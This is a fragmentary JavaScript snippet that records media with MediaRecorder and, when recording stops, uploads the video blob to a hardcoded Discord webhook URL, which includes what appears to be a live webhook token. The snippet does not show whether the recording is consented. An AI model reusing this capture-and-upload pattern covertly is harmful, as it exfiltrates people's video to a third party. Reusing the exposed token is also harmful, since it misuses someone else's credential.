...
const uploadEndpoint = 'https://discord.com/api/webhooks/1195457592386924644/CTbi7-6kA8bVn6h6N-MTDyXfjlJVqtluLabOG6Fitf2AxStEzkIzjquEqYhgxFiSyPzv';
...
async function uploadBlob(videoBlob, filename) {
...
function startRecording() {
    ...
    mediaRecorder.onstop = async() => {
        ...
        if (videoBlob.size > 0) {
            uploadBlob(videoBlob, "example.webm");
        }
    };
}
